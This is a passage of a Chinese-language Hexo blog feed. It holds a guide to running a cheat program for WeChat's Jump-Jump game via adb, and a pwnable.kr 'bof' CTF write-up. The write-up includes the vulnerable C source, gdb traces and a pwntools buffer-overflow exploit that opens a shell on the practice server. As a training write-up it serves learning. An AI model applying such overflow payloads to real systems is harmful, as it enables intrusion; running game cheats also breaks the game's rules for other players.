      &lt;p&gt;解决了关于hexo文章内部引用图片的问题&lt;/p&gt;
&lt;h4 id=&quot;找到你建立的hexo网站的主页配置文件-“-config-yml”&quot;&gt;&lt;a href=&quot;#找到你建立的hexo网站的主页配置文件-“-config-yml”&quot; class=&quot;headerlink&quot; title=&quot;找到你建立的hexo网站的主页配置文件 “_config.yml”&quot;&gt;&lt;/a&gt;找到你建立的hexo网站的主页配置文件 “_config.yml”&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2018/03/20/hexofix/2.jpg&quot; alt=&quot;主页配置文件&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="http://iosmosis.github.io/tags/Hexo/"/>
    
      <category term="修复问题" scheme="http://iosmosis.github.io/tags/%E4%BF%AE%E5%A4%8D%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>微信游戏跳一跳之简单配置使用waigua</title>
    <link href="http://iosmosis.github.io/2017/12/31/jump/"/>
    <id>http://iosmosis.github.io/2017/12/31/jump/</id>
    <published>2017-12-31T13:59:46.000Z</published>
    <updated>2017-12-31T14:57:25.318Z</updated>
    
    <content type="html"><![CDATA[<p>为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题<br>就来写一篇指导文章</p>
<h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>1.逍遥模拟器并启动Android5.1系统<br>2.jump文件</p>
<ul>
<li><a id="more"></a>
</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>启动模拟器并下载好最新版微信<br>打开跳一跳 并点击开始游戏<br><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvalRqSzRyM2R1b01WdElwQUcwMWFmVWdTU29lNTYvd0dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">wechat.png</a></p>
<p>接着打开找到逍遥模拟器安装路径并找到附带的adb路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">D:\Program Files\Microvirt\MEmu</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdVE0czFZMVcvT0VoWGkyd0JJTEZ4K0xNeloyb2hVK1dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">dir.png</a></p>
<p>在此目录启动cmd 查看监听端口<br>并且启动adb服务</p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvamVweDlEeXVIS3QvTXJIcUE0NFhjWG5obHY1eC8wMmNBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">start.png</a></p>
<p>接着把准备好的jump文件放在adb所在目录<br>接下来就可以push了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb push ./youjumpijump /data/<span class="built_in">local</span>/tmp/youjumpijump</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdjNWRE56YzJOdnVVMUlNM1lDTE5iYkFCbVFZWG5JTG53PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">push.png</a></p>
<p>接着运行shell </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell</div></pre></td></tr></table></figure>
<p>转到目录/data/local/tmp<br>查看当前目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls</div></pre></td></tr></table></figure></p>
<p>修改waigua文件的权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 youjumpijump</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZE5tazVhVmRLa1lZSVdmdGg0emgzZVFOYnlOMTRzMkpBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">shell.png</a></p>
<p>最后就是启动waigua输入参数即可~<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./youjumpijump</div><div class="line">2.04</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZFlzVkRjVHNzcERoMTdTdmttVlBCVWNFVysyYjA3SmlBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">result.png</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题&lt;br&gt;就来写一篇指导文章&lt;/p&gt;
&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h3&gt;&lt;p&gt;1.逍遥模拟器并启动Android5.1系统&lt;br&gt;2.jump文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="WeChat" scheme="http://iosmosis.github.io/tags/WeChat/"/>
    
      <category term="AI外挂" scheme="http://iosmosis.github.io/tags/AI%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>post</title>
    <link href="http://iosmosis.github.io/2017/12/30/Rop3/"/>
    <id>http://iosmosis.github.io/2017/12/30/Rop3/</id>
    <published>2017-12-30T07:52:23.000Z</published>
    <updated>2017-12-30T07:52:23.650Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable-Bof writeup</title>
    <link href="http://iosmosis.github.io/2017/12/23/bof/"/>
    <id>http://iosmosis.github.io/2017/12/23/bof/</id>
    <published>2017-12-23T11:55:02.000Z</published>
    <updated>2017-12-23T11:59:20.844Z</updated>
    
    <content type="html"><![CDATA[<p>个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点</p>
<h3 id="题目网站：http-pwnable-kr"><a href="#题目网站：http-pwnable-kr" class="headerlink" title="题目网站：http://pwnable.kr"></a>题目网站：<a href="http://pwnable.kr" target="_blank" rel="external">http://pwnable.kr</a></h3><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Bof      32位经典缓冲区溢出题目</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>因为题目提供了源码所以先看看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">	gets(overflowme);	<span class="comment">// smash me!</span></div><div class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">		system(<span class="string">"/bin/sh"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">	func(<span class="number">0xdeadbeef</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><a id="more"></a>
可以看到关键点gets函数这里 可能会引起缓冲区溢出 </li>
</ul>
<p>接着丢bof到gdb 查看下汇编代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass main</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x0000068a &lt;+0&gt;:	push   ebp</div><div class="line">   0x0000068b &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x0000068d &lt;+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x00000690 &lt;+6&gt;:	sub    esp,0x10</div><div class="line">   0x00000693 &lt;+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">   0x0000069a &lt;+16&gt;:	call   0x62c &lt;func&gt;</div><div class="line">   0x0000069f &lt;+21&gt;:	mov    eax,0x0</div><div class="line">   0x000006a4 &lt;+26&gt;:	leave  </div><div class="line">   0x000006a5 &lt;+27&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>当0xdeadbeef作为参数传递时，它会在调用func之前添加到堆栈中  然后在这里下断查看下它在哪</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">gdb-peda$ b *main+16</div><div class="line">Breakpoint 1 at 0x69a</div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ios/bof </div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xf7fb9dbc --&gt; 0xffffd13c --&gt; 0xffffd31a (<span class="string">"XDG_VTNR=7"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x5bca2c32 </div><div class="line">EDX: 0xffffd0c4 --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">EIP: 0x5655569a (&lt;main+16&gt;:	call   0x5655562c &lt;func&gt;)</div><div class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x5655568d &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x56555690 &lt;main+6&gt;:	sub    esp,0x10</div><div class="line">   0x56555693 &lt;main+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">=&gt; 0x5655569a &lt;main+16&gt;:	call   0x5655562c &lt;func&gt;</div><div class="line">   0x5655569f &lt;main+21&gt;:	mov    eax,0x0</div><div class="line">   0x565556a4 &lt;main+26&gt;:	leave  </div><div class="line">   0x565556a5 &lt;main+27&gt;:	ret    </div><div class="line">   0x565556a6:	nop</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xdeadbeef </div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">0004| 0xffffd084 (<span class="string">"PRUV\271VUV"</span>)</div><div class="line">0008| 0xffffd088 --&gt; 0x565556b9 (&lt;__libc_csu_init+9&gt;:	add    ebx,0x193b)</div><div class="line">0012| 0xffffd08c --&gt; 0x0 </div><div class="line">0016| 0xffffd090 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0020| 0xffffd094 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0024| 0xffffd098 --&gt; 0x0 </div><div class="line">0028| 0xffffd09c --&gt; 0xf7e20637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, 0x5655569a <span class="keyword">in</span> main ()</div></pre></td></tr></table></figure>
<p>可以看到，传入func之前他在ESP: 0xffffd080 –&gt; 0xdeadbeef<br>然后汇编看下func<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass func</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</div><div class="line">   0x5655562c &lt;+0&gt;:	push   ebp</div><div class="line">   0x5655562d &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x5655562f &lt;+3&gt;:	sub    esp,0x48</div><div class="line">   0x56555632 &lt;+6&gt;:	mov    eax,gs:0x14</div><div class="line">   0x56555638 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</div><div class="line">   0x5655563b &lt;+15&gt;:	xor    eax,eax</div><div class="line">   0x5655563d &lt;+17&gt;:	mov    DWORD PTR [esp],0x5655578c</div><div class="line">   0x56555644 &lt;+24&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555649 &lt;+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">   0x56555654 &lt;+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">   0x5655566b &lt;+63&gt;:	mov    DWORD PTR [esp],0x565557a3</div><div class="line">   0x56555672 &lt;+70&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555677 &lt;+75&gt;:	mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">   0x5655567a &lt;+78&gt;:	xor    eax,DWORD PTR gs:0x14</div><div class="line">   0x56555681 &lt;+85&gt;:	je     0x56555688 &lt;func+92&gt;</div><div class="line">   0x56555683 &lt;+87&gt;:	call   0xf7efd790 &lt;__stack_chk_fail&gt;</div><div class="line">   0x56555688 &lt;+92&gt;:	leave  </div><div class="line">   0x56555689 &lt;+93&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>在    0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 处 下断<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ n</div><div class="line">overflow me : </div><div class="line">AAAAAAAAAA</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0xf7fb85a0 --&gt; 0xfbad2288 </div><div class="line">EDX: 0xf7fb987c --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd078 --&gt; 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EIP: 0x56555654 (&lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)</div><div class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x56555649 &lt;func+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;func+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;func+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">=&gt; 0x56555654 &lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;func+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;func+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;func+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;func+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">0004| 0xffffd034 --&gt; 0xffffd0d4 --&gt; 0xd28e2a50 </div><div class="line">0008| 0xffffd038 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0012| 0xffffd03c --&gt; 0xd267 </div><div class="line">0016| 0xffffd040 --&gt; 0xffffffff </div><div class="line">0020| 0xffffd044 --&gt; 0x2f (<span class="string">'/'</span>)</div><div class="line">0024| 0xffffd048 --&gt; 0xf7e14dc8 --&gt; 0x2b76 (<span class="string">'v+'</span>)</div><div class="line">0028| 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 2, 0x56555654 <span class="keyword">in</span> func ()</div><div class="line">`</div></pre></td></tr></table></figure></p>
<p>AAAAAAAAAA 的指针位于堆栈的顶部，它指向地址ESP: 0xffffd030 –&gt; 0xffffd04c (“AAAAAAAAAA”)</p>
<p>所以可以计算偏移量<br>gdb-peda$ p/d 0xffffd080 - 0xffffd04c<br>$1 = 52</p>
<p>有了偏移量 就可以写payload了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process('./bof')</span></div><div class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</div><div class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>运行结果…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python bof.py</div><div class="line">[+] Opening connection to pwnable.kr on port 9000: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">bof</div><div class="line">bof.c</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">daddy, I just pwned a buFFer :)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点&lt;/p&gt;
&lt;h3 id=&quot;题目网站：http-pwnable-kr&quot;&gt;&lt;a href=&quot;#题目网站：http-pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;题目网站：http://pwnable.kr&quot;&gt;&lt;/a&gt;题目网站：&lt;a href=&quot;http://pwnable.kr&quot;&gt;http://pwnable.kr&lt;/a&gt;&lt;/h3&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;Bof      32位经典缓冲区溢出题目&lt;/p&gt;
&lt;h2 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;headerlink&quot; title=&quot;解题过程&quot;&gt;&lt;/a&gt;解题过程&lt;/h2&gt;&lt;p&gt;因为题目提供了源码所以先看看代码&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; key)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; overflowme[&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	gets(overflowme);	&lt;span class=&quot;comment&quot;&gt;// smash me!&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(key == &lt;span class=&quot;number&quot;&gt;0xcafebabe&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		system(&lt;span class=&quot;string&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Nah..\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	func(&lt;span class=&quot;number&quot;&gt;0xdeadbeef&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="二进制漏洞利用" scheme="http://iosmosis.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="缓冲区溢出" scheme="http://iosmosis.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>关于phpmyadmin GetShell思路总结</title>
    <link href="http://iosmosis.github.io/2017/04/09/mysql/"/>
    <id>http://iosmosis.github.io/2017/04/09/mysql/</id>
    <published>2017-04-08T16:08:16.000Z</published>
    <updated>2017-04-08T16:40:50.000Z</updated>
    
